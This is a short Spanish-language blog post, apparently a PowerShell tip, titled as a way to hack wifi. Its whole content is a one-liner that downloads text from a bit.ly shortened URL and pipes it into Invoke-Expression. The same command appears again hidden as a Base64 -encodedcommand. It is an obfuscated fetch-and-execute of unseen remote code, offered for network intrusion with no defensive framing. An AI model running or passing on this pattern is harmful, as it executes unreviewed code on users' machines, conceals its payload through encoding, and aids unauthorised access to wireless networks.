# Hackear wifi con PowerShell (script convertido en Base64)
## Network, PowerShell, Security, Wireless 
### URL: https://www.jesusninoc.com/2018/02/13/hackear-wifi-con-powershell-script-convertido-en-base64/
```PowerShell
#El script en Base64 es ((iwr "http://bit.ly/2CbfGrg").AllElements | Where class -eq "crayon-pre" | %{$_.innerText}) | iex
Start-Process -FilePath powershell.exe -ArgumentList ('-encodedcommand KAAoAGkAdwByACAAIgBoAHQAdABwADoALwAvAGIAaQB0AC4AbAB5AC8AMgBDAGIAZgBHAHIAZwAiACkALgBBAGwAbABFAGwAZQBtAGUAbgB0AHMAIAB8ACAAVwBoAGUAcgBlACAAYwBsAGEAcwBzACAALQBlAHEAIAAiAGMAcgBhAHkAbwBuAC
0AcAByAGUAIgAgAHwAIAAlAHsAJABfAC4AaQBuAG4AZQByAFQAZQB4AHQAfQApACAAfAAgAGkAZQB4AA==')

```
